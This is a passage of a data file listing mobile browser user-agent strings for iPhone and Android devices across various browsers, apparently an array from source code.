    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/231.0.475926209 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/107.0.1418.36 Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148  CSDNApp/5.11.1(iOS)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/236.0.484392333 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/106.0.5249.92 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/93.0.4577.78 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/106.1  Mobile/15E148 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)  Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/107.0.1418.42 Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/180.0.400278405 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [LinkedInApp]/9.25.434',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.25 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; A20S PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; CLT-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; CLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; ELE-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; LYA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(7) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(7)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(8) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(8) plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; RMX2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Safari/537.36 OPR/72.3.3767.68685',
    'Mozilla/5.0 (Linux; Android 10; TECNO KE6j) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; TECNO KE7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; YAL-L21; HMSCore 6.8.0.312; GMSCore 22.44.17) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; 21061119AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; 2201117TI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; BE2029) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; BL8800Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; IN2021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2007J3SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; M2103K19PG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; moto g(9) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; ONEPLUS A6000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; ONEPLUS A6010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; ONEPLUS A6013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; RMX1971) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; RMX1992) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SHARK PRS-H0 Build/PROS2203060OS00MP5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/387.0.0.22.106;]',
    'Mozilla/5.0 (Linux; Android 11; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A207M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G977B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-M405F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; TECNO BD2d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 OPR/67.1.3508.63168',
    'Mozilla/5.0 (Linux; Android 12; 21081111RG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; 22041211AC Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/96.0.4664.104 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; A063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; DN2101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; I2012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; KB2001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; LE2101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; LGE-AN00; HMSCore 6.8.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.4.302 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2007J20CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2007J3SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g(60)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; MT2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 3a XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Redmi Note 9S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; RMX3360) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A336E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A716B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-F721N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-F936N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-F936N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 EdgA/107.0.1418.35',
    'Mozilla/5.0 (Linux; Android 12; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G990E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G991U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 EdgA/107.0.1418.43',
    'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-N975W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S901E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S901N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; V2203) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; vivo 1920) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; LE2123) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.91 Mobile Safari/537.36 OPR/73.0.3788.68491',
    'Mozilla/5.0 (Linux; Android 13; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.0; Archos 97c Platinum) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.2; A0001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; AUM-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; LG-H870DS Build/OPR1.170623.032) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 8.0.0; MHA-AL00 Build/HUAWEIMHA-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 BingWeb/6.9.6',
    'Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36',
